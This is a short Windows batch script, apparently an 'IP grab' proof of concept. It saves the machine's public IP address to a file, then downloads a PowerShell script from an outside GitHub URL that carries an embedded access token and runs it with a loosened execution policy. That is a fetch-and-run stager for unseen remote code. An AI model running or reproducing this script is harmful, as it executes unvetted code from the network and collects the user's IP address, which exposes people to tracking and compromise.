@echo off

curl https://ip.aruljohn.com/ > ip.txt
curl https://raw.githubusercontent.com/DorkYBru/PoC-Ip-Grab-By-Cmd-windows/main/segs.ps1?token=GHSAT0AAAAAABUD76W3VGVUKIFFOHDVBZYAYUAAIFQ > script.ps1
Powershell.exe -executionpolicy remotesigned -File script.ps1

